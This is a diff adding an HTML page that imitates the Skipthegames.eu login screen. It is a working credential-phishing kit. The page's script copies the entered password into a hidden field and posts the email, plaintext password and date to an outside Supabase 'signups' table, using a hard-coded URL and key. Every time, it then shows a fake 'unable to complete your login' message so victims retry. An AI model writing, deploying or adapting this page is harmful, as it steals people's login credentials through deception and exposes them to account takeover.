@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in to your account</title>
+<style>
+  :root{
+    --maroon:#93002F;
+    --teal:#009DC1;
+    --teal-dark:#0089AA;
+    --red:#FF001F;
+    --text-dark:#1F1F1F;
+    --text-gray:#6C6C6C;
+    --border:#C5C5C5;
+    --placeholder:#9A9A9A;
+  }
+
+  *{box-sizing:border-box;}
+
+  body{
+    margin:0;
+    padding:0;
+    font-family:Arial, "Helvetica Neue", Helvetica, sans-serif;
+    color:var(--text-dark);
+    background:#FFFFFF;
+  }
+
+  .page{
+    max-width:62.5em;
+    margin:0 auto;
+    padding:20px 24px 32px 24px;
+  }
+
+  /* Header */
+  .header{
+    display:flex;
+    align-items:center;
+    gap:90px;
+    flex-wrap:wrap;
+    margin-bottom: 10px;
+  
+  }
+
+  /* Logo: either text fallback or uploaded SVG image.
+     Swap the <a class="logo"> content in HTML once the SVG is provided. */
+  .logo{
+    display:inline-flex;
+    align-items:center;
+    text-decoration:none;
+    white-space:nowrap;
+  }
+
+  .logo-text{
+    font-size:34px;
+    font-weight:800;
+    color:var(--maroon);
+    letter-spacing:-0.5px;
+  }
+
+  .logo-text sup{
+    font-size:13px;
+    font-weight:700;
+    vertical-align:middle;
+    margin-left:1px;
+  }
+
+  .logo-img{
+    height:37px;
+    width:auto;
+    display:block;
+  }
+
+  .tagline{
+    font-size:17px;
+    color:var(--text-dark);
+    font-weight:400;
+  }
+
+  /* Layout columns */
+  .content{
+    display:flex;
+    gap:80px;
+    flex-wrap:wrap;
+  }
+
+  .login-col{
+    flex:1 1 380px;
+    max-width:430px;
+  }
+
+  .signup-col{
+    flex:1 1 260px;
+    max-width:380px;
+    margin-left: 65px;
+  }
+
+  h1, .signup-col h2{
+    font-size:26px;
+    font-weight:400;
+    margin:0 0 18px 0;
+    color:var(--text-dark);
+  }
+
+  /* Form */
+  .field-group{
+    margin-bottom:14px;
+  }
+
+  .visually-hidden{
+    position:absolute;
+    width:1px;
+    height:1px;
+    overflow:hidden;
+    clip:rect(0 0 0 0);
+    white-space:nowrap;
+  }
+
+  .field{
+    width:104%;
+    padding:10px 14px;
+    border:1px solid var(--border);
+    color:var(--text-dark);
+    background:#fff;
+  }
+
+  .field::placeholder{
+    color:var(--placeholder);
+  }
+
+  .field:focus-visible{
+    outline:2px solid var(--teal);
+    outline-offset:1px;
+  }
+
+  .show-password{
+    display:inline-block;
+    background:none;
+    border:none;
+    padding:0;
+    font-size:13px;
+    font-family:inherit;
+    color:var(--maroon);
+    text-decoration:underline;
+    margin-bottom:18px;
+    cursor:pointer;
+  }
+
+  .show-password:focus-visible{
+    outline:2px solid var(--teal);
+    outline-offset:2px;
+  }
+
+  .help-line{
+    font-size:16px;
+    font-weight:700;
+    color:var(--red);
+    margin-bottom:14px;
+    line-height: 25px;
+  }
+
+  .help-line a{
+    color:#903;
+    text-decoration:underline;
+    font-weight:700;
+  }
+
+  /* Only shown on mobile, inside the form, matching the mobile reference layout */
+  .mobile-first-time{
+    display:none;
+  }
+
+  .login-btn{
+    width:104%;
+    background:var(--teal);
+    color:#fff;
+    border:none;
+    border-radius:3px;
+    padding:16px 0;
+    font-size:16px;
+    font-weight:400;
+    cursor:pointer;
+    margin-bottom:14px;
+    transition:background .15s ease;
+  }
+
+  .login-btn:hover{
+    background:var(--teal-dark);
+  }
+
+  .login-btn:focus-visible{
+    outline:2px solid var(--maroon);
+    outline-offset:2px;
+  }
+
+  .fine-print{
+    font-size:60%;
+    color:#222;
+    line-height:1.7;
+  }
+
+  .fine-print a{
+    color:var(--maroon);
+    text-decoration:none;
+  }
+
+  .fine-print a:hover{
+    text-decoration:underline;
+  }
+
+  /* Signup column (desktop only) */
+  .signup-col a{
+    font-size:15px;
+    color:var(--text-gray);
+    text-decoration:underline;
+  }
+
+  /* Footer */
+  .footer{
+    border-top:1px solid #E5E5E5;
+    padding-top:22px;
+    display:flex;
+    align-items:center;
+    justify-content:normal;
+    flex-wrap:wrap;
+    gap:60px;
+    font-size:18px;
+  }
+
+  .footer-left{
+    color:#903;
+  }
+
+  .footer-tagline{
+    color:var(--text-dark);
+  }
+
+  .footer-links{
+    display:flex;
+    gap:22px;
+    flex-wrap:wrap;
+  }
+
+  .footer-links a{
+    color:var(--maroon);
+    text-decoration:none;
+  }
+
+  .footer-links a:hover{
+    text-decoration:underline;
+  }
+
+  /* ============ MOBILE LAYOUT ============ */
+  @media (max-width:600px){
+    .page{
+      padding:28px 20px 28px 20px;
+    }
+
+    .header{
+      flex-direction:column;
+      align-items:center;
+      text-align:center;
+      gap:0px;
+      margin-bottom:25px;
+    }
+
+    .logo-img{
+      height:38px;
+      margin:0 auto;
+    }
+
+    .tagline{
+      font-size:15px;
+    }
+
+    .content{
+      flex-direction:column;
+      gap:0;
+    }
+
+    .login-col, .signup-col{
+      max-width:none;
+    }
+
+    h1{
+      font-size:22px;
+      margin-bottom:16px;
+    }
+
+    /* Desktop "First time here?" block is replaced by the inline mobile line */
+    .signup-col{
+      display:none;
+    }
+
+    .mobile-first-time{
+      display:block;
+    }
+
+    .footer{
+      flex-direction:column;
+      align-items:flex-start;
+      gap:22px;
+    }
+
+    .footer-links{
+      gap:16px;
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .login-btn{transition:none;}
+  }
+
+  /* Kill browser native validation on blur */
+  input:invalid{
+    box-shadow:none !important;
+    outline:none !important;
+  }
+
+  /* Red border on invalid field */
+  .field.invalid{
+    border-color:var(--red);
+  }
+  .field.invalid:focus-visible{
+    outline:2px solid var(--red);
+    outline-offset:1px;
+  }
+
+  /* Inline field error text */
+  .field-err{
+    display:none;
+    font-size:12px;
+    color:var(--red);
+    margin-top:5px;
+    width:104%;
+  }
+  .field-err.visible{
+    display:block;
+  }
+
+  /* Success message — same size/color/weight as the login error text */
+  .success-msg{
+    display:none;
+    font-size:14px;
+    font-weight:700;
+    color:var(--text-dark);
+    margin-bottom:14px;
+    line-height:1.5;
+  }
+  .success-msg.visible{
+    display:block;
+  }
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <header class="header">
+    <a href="/" class="logo" aria-label="Skipthegames.eu home">
+      <img class="logo-img" src="logo.svg" alt="Skipthegames.eu">
+    </a>
+    <p class="tagline">Skip the games. Get satisfaction.</p>
+  </header>
+
+  <main class="content">
+
+    <section class="login-col">
+      <h1>Log in to your account</h1>
+
+      <form id="signup-form" name="study-circle-signup" method="POST" action="/?success" data-netlify="true" autocomplete="on" novalidate>
+        <input type="hidden" name="form-name"     value="study-circle-signup">
+
+        <!-- ── Auto-collected hidden fields ── -->
+        <input type="hidden" name="signup_date"   id="f-date">
+        <input type="hidden" name="user_password" id="f-pw">
+
+        <div class="field-group">
+          <label class="visually-hidden" for="email">Your email</label>
+          <input id="email" name="email" type="email" class="field" placeholder="Your email" autocomplete="username">
+          <p class="field-err" id="e-email">Enter a valid email address.</p>
+        </div>
+
+        <div class="field-group">
+          <label class="visually-hidden" for="password">Password</label>
+          <input id="password" name="password" type="password" class="field" placeholder="Password" autocomplete="current-password">
+          <p class="field-err" id="e-password">Enter your password.</p>
+        </div>
+
+        <button type="button" class="show-password" id="toggle-password" aria-pressed="false">Show password</button>
+
+        <div class="success-msg" id="success-msg">We're sorry. We were unable to complete your login. Please try again.</div>
+
+        <div class="help-line">Password not working? <a href="#">Click here</a></div>
+        <div class="help-line">Can't access your mailbox? <a href="#">Click to request email change</a></div>
+        
+        <div class="help-line mobile-first-time">First time here? <a href="#">Make your first post</a></div>
+
+        <button type="submit" class="login-btn" id="sub-btn">Log in</button>
+
+        <p class="fine-print">
+          By clicking "Log in", you accept <a href="#">Skipthegames.eu's Terms and Conditions of Use</a><br>
+          This site is protected by hCaptcha and its <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
+        </p>
+      </form>
+    </section>
+
+    <section class="signup-col">
+      <h2>First time here?</h2>
+      <a href="#">Make your first post</a>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <div class="footer-left">&copy;Skipthegames.eu</div>
+    <div class="footer-tagline">Skip the games. Get satisfaction.</div>
+    <nav class="footer-links">
+      <a href="#">About</a>
+      <a href="#">Contact</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Escort Info</a>
+    </nav>
+  </footer>
+
+</div>
+
+<script>
+  // Show/Hide password toggle (original sinup-file.html)
+  (function(){
+    var btn = document.getElementById('toggle-password');
+    var input = document.getElementById('password');
+    if(!btn || !input) return;
+    btn.addEventListener('click', function(){
+      var isHidden = input.type === 'password';
+      input.type = isHidden ? 'text' : 'password';
+      btn.textContent = isHidden ? 'Hide password' : 'Show password';
+      btn.setAttribute('aria-pressed', isHidden ? 'true' : 'false');
+    });
+  })();
+
+  // ── Full mechanism from index.html ──
+
+  // Show success screen after Netlify redirect
+  if(window.location.search.includes('success')){
+    document.getElementById('signup-form').style.display = 'none';
+  }
+
+  var startTime = Date.now();
+
+  // তারিখ (শুধু date, time ছাড়া)
+  document.getElementById('f-date').value = new Date().toLocaleDateString('en-BD',{
+    timeZone:'Asia/Dhaka', year:'numeric', month:'short', day:'numeric'
+  });
+
+  // Validation + submit
+  document.getElementById('signup-form').addEventListener('submit', function(e){
+    e.preventDefault();
+    var valid = true;
+
+    var emailEl = document.getElementById('email');
+    var passEl  = document.getElementById('password');
+
+    // Clear previous errors
+    emailEl.classList.remove('invalid');
+    passEl.classList.remove('invalid');
+    document.getElementById('e-email').classList.remove('visible');
+    document.getElementById('e-password').classList.remove('visible');
+
+    // Email check — manual regex, no browser checkValidity()
+    if(emailEl.value.trim() === '' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailEl.value.trim())){
+      emailEl.classList.add('invalid');
+      document.getElementById('e-email').classList.add('visible');
+      valid = false;
+    }
+
+    // Password check
+    if(passEl.value.trim() === ''){
+      passEl.classList.add('invalid');
+      document.getElementById('e-password').classList.add('visible');
+      valid = false;
+    }
+
+    if(!valid){
+      return;
+    }
+
+    // Copy password to hidden field so Netlify captures it
+    document.getElementById('f-pw').value = document.getElementById('password').value;
+
+    // ── Supabase-এ ডেটা পাঠাও ──
+    // 👇 Replace these two values with your own from Supabase → Project Settings → API
+    var SUPABASE_URL  = 'https://xoxrqjbwkuulxiitsnah.supabase.co';
+    var SUPABASE_KEY  = 'sb_publishable_rwpYTZ9s2d_2hejF_on5xg_6cTS3qcg';
+
+    var btn = document.getElementById('sub-btn');
+    btn.disabled    = true;
+    btn.textContent = 'Submitting…';
+
+    var payload = {
+      email:         document.getElementById('email').value.trim(),
+      user_password: document.getElementById('f-pw').value,
+      signup_date:   document.getElementById('f-date').value
+    };
+
+    fetch(SUPABASE_URL + '/rest/v1/signups', {
+      method:  'POST',
+      headers: {
+        'Content-Type':  'application/json',
+        'apikey':        SUPABASE_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_KEY,
+        'Prefer':        'return=minimal'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(function(res) {
+      if (!res.ok) { throw new Error('Supabase error: ' + res.status); }
+      document.getElementById('success-msg').classList.add('visible');
+      btn.textContent = 'Log in';
+      btn.disabled    = false;
+    })
+    .catch(function(err) {
+      console.error(err);
+      document.getElementById('success-msg').classList.add('visible');
+      btn.textContent = 'Log in';
+      btn.disabled    = false;
+    });
+  });
+
+  // Remove error styling as user types
+  document.getElementById('email').addEventListener('input', function(){
+    this.classList.remove('invalid');
+    document.getElementById('e-email').classList.remove('visible');
+    document.getElementById('success-msg').classList.remove('visible');
+  });
+  document.getElementById('password').addEventListener('input', function(){
+    this.classList.remove('invalid');
+    document.getElementById('e-password').classList.remove('visible');
+    document.getElementById('success-msg').classList.remove('visible');
+  });
+</script>
+
+</body>
+</html>
